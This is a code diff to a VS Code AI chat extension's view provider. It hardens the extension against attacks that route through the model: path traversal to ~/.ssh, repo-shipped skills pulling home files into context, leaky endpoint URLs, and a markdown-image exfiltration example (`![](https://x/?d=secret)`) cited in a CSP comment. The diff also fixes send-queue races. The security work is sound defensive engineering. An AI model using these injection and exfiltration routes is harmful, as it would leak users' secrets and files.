@@ -51,7 +51,8 @@ import { deriveTitleFrom, looksLikeActionablePlan, sanitizeTitle, planStepsToTod
 import { loadSkills, invalidateSkillsCache, skillInstructions } from './context/skills';
 import { fetchSkillCatalog, searchSkills } from './context/skillCatalog';
 import { checkNpxAvailable, installSkillPackage } from './context/skillInstaller';
-import { registerReadableRoot } from './agent/core/tools/resolvePath';
+import { registerReadableRoot, isInsideRoot } from './agent/core/tools/resolvePath';
+import { isLocalUrl } from './providers/localServers';
 
 interface ChatDeps {
   secrets: SecretStore;
@@ -1151,7 +1152,7 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
       }
       case 'sendMessage': {
         const target = this.current();
-        if (target.activeRequestId) {
+        if (target.activeRequestId || target.queuedSends?.length) {
           (target.queuedSends ??= []).push(m);
           this.post({ type: 'queuedMessage', sessionId: target.id, requestId: m.requestId, state: 'queued' });
           break;
@@ -1228,9 +1229,14 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
       case 'setFallbackConfig':
         await this.deps.settings.setFallback(m.entries);
         break;
-      case 'setEndpoint':
+      case 'setEndpoint': {
+        // The platform's stored key goes wherever this points: TLS, or a local server.
+        let ok = false;
+        try { const u = new URL(m.url.trim()); ok = u.protocol === 'https:' || (u.protocol === 'http:' && isLocalUrl(u.href)); } catch { /* not a URL */ }
+        if (!ok) { void vscode.window.showErrorMessage(`TierMux: endpoint must be an https:// URL (or http:// on localhost/LAN): ${m.url}`); break; }
         await this.deps.settings.setEndpoint(m.platform, m.url);
         break;
+      }
       case 'resetEndpoint':
         await this.deps.settings.resetEndpoint(m.platform);
         break;
@@ -1724,7 +1730,7 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
       if (!folder) { this.post({ type: 'error', sessionId: this.viewedSessionId, message: 'Open a folder first — non-image attachments need a workspace to land in.' }); return; }
       const dir = vscode.Uri.joinPath(folder.uri, '.tiermux', 'attach');
       await vscode.workspace.fs.createDirectory(dir);
-      const fileUri = vscode.Uri.joinPath(dir, m.name);
+      const fileUri = vscode.Uri.joinPath(dir, m.name.replace(/^.*[\\/]/, '') || 'attachment');
       await vscode.workspace.fs.writeFile(fileUri, bytes);
       const attachment = await buildAttachmentFromUri(fileUri, m.source ?? 'drop');
       this.post({ type: 'attachmentAdded', attachment });
@@ -1858,6 +1864,7 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
     if (!root) return;
     try {
       const uri = vscode.Uri.joinPath(root, path);
+      if (!isInsideRoot(uri, root)) return; // the path is model output; `..` must not open ~/.ssh
       const doc = await vscode.workspace.openTextDocument(uri);
       const editor = await vscode.window.showTextDocument(doc);
       const pos = new vscode.Position(Math.max(0, line - 1), 0);
@@ -2172,7 +2179,9 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
     s.model = m.model;
     s.reasoningEffort = m.reasoningEffort;
     diagLog('sendMessage', `requestId=${m.requestId} mode=${m.mode} pinnedModel="${m.model ?? '<none>'}" reasoningEffort=${m.reasoningEffort ?? '<none>'}`);
-    const mentionResult = await resolveMentions(prompt).catch(() => ({ text: '', count: 0 }));
+    // Mentions come from what the user typed, never from a skill body — a repo-shipped skill
+    // could otherwise pull any `@~/file` into context.
+    const mentionResult = await resolveMentions(slash && skill ? slash.rest : prompt).catch(() => ({ text: '', count: 0 }));
     const contextText = mentionResult.text;
     s.lastMentionCount = mentionResult.count;
     diagLog('send.gate', `requestId=${m.requestId} · resolveMentions done (count=${mentionResult.count})`);
@@ -2383,7 +2392,6 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
 
       release();
       if (this.isActiveRun(s, m.requestId)) {
-        s.activeRequestId = undefined;
         this.clearInProgressTurn(s, m.requestId);
         this.settlePendingApprovals(s, false); // safety net: never leave a command waiting after the run ends
         this.settlePendingAskUser(s);
@@ -2392,8 +2400,11 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
         this.post({ type: 'busy', sessionId: s.id, busy: false });
         this.setStatus(s.id, 'finished');
         this.notifyFinishedInBackground(s);
+        // The run stays "active" through condense so a send landing meanwhile is queued, not
+        // started against a history that is being rewritten.
         await this.maybeAutoCondense(s);
         void this.maybeGenerateTitle(s);
+        if (this.isActiveRun(s, m.requestId)) s.activeRequestId = undefined;
         this.drainQueued(s);
       }
     }
@@ -2767,7 +2778,6 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
     } finally {
       release();
       if (this.isActiveRun(s, requestId)) {
-        s.activeRequestId = undefined;
         this.clearInProgressTurn(s, requestId);
         this.settlePendingApprovals(s, false);
         this.settlePendingAskUser(s);
@@ -2777,6 +2787,7 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
         this.setStatus(s.id, 'finished');
         this.notifyFinishedInBackground(s);
         await this.maybeAutoCondense(s);
+        if (this.isActiveRun(s, requestId)) s.activeRequestId = undefined;
         this.drainQueued(s);
       }
     }
@@ -2891,6 +2902,9 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
     s.queuedSends = [];
     s.cancel?.cancel();
     s.activeRequestId = undefined; // invalidates the run's liveness guard (isActiveRun)
+    // The run's own finally is skipped by that guard, so a stopped turn must not be left
+    // looking like a crash for the next reload to "recover".
+    if (executingRequestId) this.clearInProgressTurn(s, executingRequestId);
     this.settlePendingApprovals(s, false); // unblock any command/edit awaiting a click
     this.settlePendingAskUser(s); // unblock any in-chat askUser card
     s.pendingPlanUser = undefined;
@@ -3347,7 +3361,6 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
     } finally {
       release();
       if (this.isActiveRun(s, m.requestId)) {
-        s.activeRequestId = undefined;
         this.clearInProgressTurn(s, m.requestId);
         this.settlePendingApprovals(s, false);
         this.settlePendingAskUser(s);
@@ -3357,6 +3370,7 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
         this.setStatus(s.id, 'finished');
         this.notifyFinishedInBackground(s);
         await this.maybeAutoCondense(s);
+        if (this.isActiveRun(s, m.requestId)) s.activeRequestId = undefined;
         this.drainQueued(s);
       }
     }
@@ -3558,7 +3572,8 @@ export class ChatViewProvider implements vscode.WebviewViewProvider {
     };
     const csp = [
       `default-src 'none'`,
-      `img-src ${webview.cspSource} https: data: blob:`,
+      // No remote images: a model-written `![](https://x/?d=secret)` would fetch on render.
+      `img-src ${webview.cspSource} data: blob:`,
       `style-src ${webview.cspSource} 'nonce-${nonce}'`,
       // `${webview.cspSource}` is needed alongside the nonce for pdf.js: it is an ES module,
       // and a module's own `import` is matched against the source list, NOT the nonce (a nonce
